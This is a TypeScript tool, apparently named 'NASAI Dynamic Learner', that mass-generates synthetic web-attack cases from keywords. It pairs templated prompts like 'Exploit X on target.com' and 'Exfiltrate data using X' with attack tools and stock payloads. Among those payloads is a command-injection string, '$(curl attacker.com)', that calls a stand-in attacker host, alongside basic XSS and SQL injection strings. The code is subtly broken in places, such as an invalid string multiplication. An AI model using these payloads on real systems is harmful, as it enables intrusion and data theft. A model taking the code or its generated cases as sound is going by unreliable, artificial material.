import * as fs from 'fs';
import * as path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

interface LearnedPattern {
  keyword: string;
  count: number;
  category: string;
  context: string;
  last_seen: string;
}

interface DynamicCase {
  id: string;
  source: string;
  category: string;
  prompt: string;
  difficulty: string;
  tools: string[];
  vulnerability: string;
  payload: string;
  year: number;
}

class DynamicLearner {
  private patterns: LearnedPattern[] = [];
  private caseLibrary: DynamicCase[] = [];
  private learnedKeywords: Map<string, number> = new Map();
  private baseCases: number = 0;

  constructor() {
    this.loadLearnedData();
  }

  private loadLearnedData() {
    try {
      const data = fs.readFileSync(path.join(__dirname, 'learned_cases.json'), 'utf-8');
      this.caseLibrary = JSON.parse(data);
      this.baseCases = this.caseLibrary.length;
    } catch {
      this.caseLibrary = [];
    }

    try {
      const patterns = fs.readFileSync(path.join(__dirname, 'learned_patterns.json'), 'utf-8');
      this.patterns = JSON.parse(patterns);
    } catch {
      this.patterns = [];
    }
  }

  async learnKeyword(keyword: string, category?: string): Promise<void> {
    const current = this.learnedKeywords.get(keyword.toLowerCase()) || 0;
    this.learnedKeywords.set(keyword.toLowerCase(), current + 1);

    const existingPattern = this.patterns.find(p => p.keyword === keyword.toLowerCase());
    if (existingPattern) {
      existingPattern.count++;
      existingPattern.last_seen = new Date().toISOString();
    } else {
      this.patterns.push({
        keyword: keyword.toLowerCase(),
        count: 1,
        category: category || this.detectCategory(keyword),
        context: this.detectContext(keyword),
        last_seen: new Date().toISOString()
      });
    }

    await this.generateCasesForKeyword(keyword);
  }

  private detectCategory(keyword: string): string {
    const k = keyword.toLowerCase();
    if (k.includes('inject') || k.includes('xss') || k.includes('script')) return 'XSS';
    if (k.includes('sql') || k.includes('database')) return 'SQLi';
    if (k.includes('auth') || k.includes('login') || k.includes('password')) return 'Auth';
    if (k.includes('rce') || k.includes('exec') || k.includes('command')) return 'RCE';
    if (k.includes('ssrf') || k.includes('request')) return 'SSRF';
    if (k.includes('csrf') || k.includes('cross')) return 'CSRF';
    if (k.includes('file') || k.includes('upload')) return 'File Upload';
    if (k.includes('bypass') || k.includes('waf')) return 'Bypass';
    if (k.includes('ddos') || k.includes('flood')) return 'DoS';
    if (k.includes('info') || k.includes('disclosure')) return 'Info';
    if (k.includes('idor') || k.includes('permission')) return 'IDOR';
    if (k.includes('jwt') || k.includes('token')) return 'JWT';
    if (k.includes('websocket')) return 'WebSocket';
    if (k.includes('desync') || k.includes('smuggling')) return 'Smuggling';
    if (k.includes('prototype') || k.includes('pollution')) return 'Pollution';
    if (k.includes('cache')) return 'Cache';
    return 'General';
  }

  private detectContext(keyword: string): string {
    const k = keyword.toLowerCase();
    if (k.includes('web') || k.includes('http')) return 'Web Application';
    if (k.includes('api') || k.includes('rest')) return 'API';
    if (k.includes('mobile') || k.includes('app')) return 'Mobile';
    if (k.includes('cloud') || k.includes('aws')) return 'Cloud';
    if (k.includes('network')) return 'Network';
    if (k.includes('docker') || k.includes('container')) return 'Container';
    return 'Web';
  }

  private async generateCasesForKeyword(keyword: string): Promise<void> {
    const category = this.detectCategory(keyword);
    const context = this.detectContext(keyword);
    const variations = this.getVariations(keyword);
    const year = 2024 + Math.floor(Math.random() * 2);

    for (const variation of variations) {
      const newCase: DynamicCase = {
        id: `LEARN-${keyword.toUpperCase().substring(0, 4)}-${Date.now()}-${Math.random().toString(36).substr(2, 4)}`,
        source: 'learned',
        category,
        prompt: variation,
        difficulty: this.getDifficulty(category),
        tools: this.getToolsForCategory(category),
        vulnerability: category,
        payload: this.getPayload(category),
        year
      };
      this.caseLibrary.push(newCase);
    }
  }

  private getVariations(keyword: string): string[] {
    const k = keyword.toLowerCase();
    return [
      `Exploit ${k} on target.com`,
      `Test ${k} on api.target.com/login`,
      `Find ${k} vulnerability in /admin`,
      `Bypass ${k} with encoding`,
      `Chain ${k} with another bug`,
      `Detect ${k} with automation`,
      `RCE via ${k} on legacy`,
      `Exfiltrate data using ${k}`,
      `Privilege escalation via ${k}`,
      `Blind ${k} on search endpoint`,
    ];
  }

  private getDifficulty(category: string): string {
    const difficulties = { 'XSS': 'medium', 'SQLi': 'high', 'Auth': 'high', 'RCE': 'critical', 'SSRF': 'high', 'CSRF': 'medium', 'File Upload': 'high', 'Bypass': 'critical', 'DoS': 'medium', 'Info': 'low', 'IDOR': 'medium', 'JWT': 'high', 'WebSocket': 'high', 'Smuggling': 'critical', 'Pollution': 'high', 'Cache': 'medium' };
    return difficulties[category as keyof typeof difficulties] || 'medium';
  }

  private getToolsForCategory(category: string): string[] {
    const tools: Record<string, string[]> = { 'XSS': ['curl', 'xsser', 'grep'], 'SQLi': ['sqlmap', 'curl'], 'Auth': ['hydra', 'curl'], 'RCE': ['curl', 'payload'], 'SSRF': ['curl', 'nmap'], 'CSRF': ['curl'], 'File Upload': ['curl', 'file'], 'Bypass': ['nmap', 'curl'], 'DoS': ['curl', 'hping3'], 'Info': ['nmap', 'whois'], 'IDOR': ['curl', 'burp'], 'JWT': ['jwt_tool'], 'WebSocket': ['curl', 'wscat'], 'Smuggling': ['curl', 'nmap'], 'Pollution': ['curl', 'node'], 'Cache': ['curl'] };
    return tools[category] || ['curl'];
  }

  private getPayload(category: string): string {
    const payloads: Record<string, string> = { 'XSS': '<script>alert(1)</script>', 'SQLi': "' OR '1'='1", 'RCE': '$(curl attacker.com)', 'SSRF': 'http://internal:8080', 'Bypass': 'O:{}', 'DoS': '\x00' * 10000 };
    return payloads[category] || 'test';
  }

  async learnInput(input: string): Promise<void> {
    const words = input.toLowerCase().split(/\s+/);
    const keywords = words.filter(w => w.length > 3 && !this.isCommonWord(w));

    for (const keyword of keywords) {
      await this.learnKeyword(keyword);
    }

    this.saveLearnedData();
  }

  private isCommonWord(word: string): boolean {
    const common = ['the', 'and', 'for', 'are', 'but', 'not', 'you', 'all', 'can', 'had', 'her', 'was', 'one', 'our', 'out', 'day', 'get', 'has', 'him', 'his', 'how', 'its', 'may', 'now', 'old', 'see', 'than', 'that', 'this', 'was', 'will', 'with', 'code', 'exec', 'test', 'find'];
    return common.includes(word);
  }

  private saveLearnedData() {
    fs.writeFileSync(path.join(__dirname, 'learned_cases.json'), JSON.stringify(this.caseLibrary, null, 2));
    fs.writeFileSync(path.join(__dirname, 'learned_patterns.json'), JSON.stringify(this.patterns, null, 2));
  }

  getStats() {
    return {
      total_cases: this.caseLibrary.length,
      new_cases: this.caseLibrary.length - this.baseCases,
      learned_keywords: this.learnedKeywords.size,
      top_keywords: Array.from(this.learnedKeywords.entries()).sort((a, b) => b[1] - a[1]).slice(0, 10),
      by_category: this.getCategoryStats()
    };
  }

  private getCategoryStats() {
    const stats: Record<string, number> = {};
    for (const c of this.caseLibrary) {
      stats[c.category] = (stats[c.category] || 0) + 1;
    }
    return stats;
  }

  generateMassiveDataset(targetCount: number): DynamicCase[] {
    const categories = ['XSS', 'SQLi', 'Auth', 'RCE', 'SSRF', 'CSRF', 'File Upload', 'Bypass', 'DoS', 'Info', 'IDOR', 'JWT', 'WebSocket', 'Smuggling', 'Pollution', 'Cache', 'Deserialization', 'XXE', 'OAuth', 'SSTI'];
    const targets = ['target.com', 'api.target.com', 'app.target.com', 'admin.target.com', 'legacy.target.com', 'test.target.com', 'staging.target.com', 'dev.target.com', 'v2.target.com', 'internal.target.com'];
    const paths = ['/login', '/admin', '/api', '/upload', '/search', '/profile', '/users', '/comments', '/posts', '/settings', '/config', '/admin/manage', '/api/v1', '/upload/media', '/graphql', '/search?q=', '/profile/edit', '/user/1', '/admin/user', '/api/auth'];
    const protocols = ['http://', 'https://'];
    const encodings = ['', '%2F', '%20', '%00', '\x00', '../../../', '..\\..\\', '%2e%2e%2f', 'UTF-8', 'URL', 'Base64', 'HTML'];

    const newCases: DynamicCase[] = [];
    let id = this.caseLibrary.length + 1;

    console.log(`🎯 Generating ${targetCount} unique cases...`);

    for (let i = 0; i < targetCount; i++) {
      const category = categories[Math.floor(Math.random() * categories.length)];
      const target = targets[Math.floor(Math.random() * targets.length)];
      const path = paths[Math.floor(Math.random() * paths.length)];
      const proto = protocols[Math.floor(Math.random() * protocols.length)];
      const encoding = encodings[Math.floor(Math.random() * encodings.length)];

      const difficulty = this.getDifficulty(category);
      const prompt = `${category} on ${proto}${target}${path}${encoding ? ' with ' + encoding : ''}`;

      newCases.push({
        id: `GEN-${id.toString().padStart(6, '0')}`,
        source: 'generated',
        category,
        prompt,
        difficulty,
        tools: this.getToolsForCategory(category),
        vulnerability: category,
        payload: this.getPayload(category),
        year: 2024 + Math.floor(Math.random() * 3)
      });
      id++;

      if (i % 10000 === 0 && i > 0) {
        console.log(`   Progress: ${i}/${targetCount}`);
      }
    }

    this.caseLibrary.push(...newCases);
    this.saveLearnedData();

    return newCases;
  }
}

async function main() {
  const args = process.argv.slice(2);
  const learner = new DynamicLearner();

  if (args[0] === 'learn' && args[1]) {
    console.log(`\n🧠 Learning from: "${args[1]}"`);
    await learner.learnInput(args[1]);

    const stats = learner.getStats();
    console.log(`
📊 Learning Stats:
   Total Cases: ${stats.total_cases}
   New Cases:   ${stats.new_cases}
   Keywords:   ${stats.learned_keywords}
`);
    console.log('   Top Keywords:', stats.top_keywords.slice(0, 5).map(([k, v]) => `${k}(${v})`).join(', '));
    return;
  }

  if (args[0] === 'generate' && args[1]) {
    const count = parseInt(args[1]) || 1000;
    learner.generateMassiveDataset(count);

    const stats = learner.getStats();
    console.log(`
✅ Generated ${count} new cases!

📊 Total Stats:
   Total Cases: ${stats.total_cases}
   By Category:
${Object.entries(stats.by_category).map(([k, v]) => `     ${k}: ${v}`).join('\n')}
`);
    return;
  }

  if (args[0] === 'stats') {
    const stats = learner.getStats();
    console.log(JSON.stringify(stats, null, 2));
    return;
  }

  console.log(`
🧠 NASAI Dynamic Learner

Usage:
   learn <keyword>  - Learn from keyword and generate cases
   generate <n>    - Generate n new random cases
   stats           - Show learning statistics
`);
}

main().catch(console.error);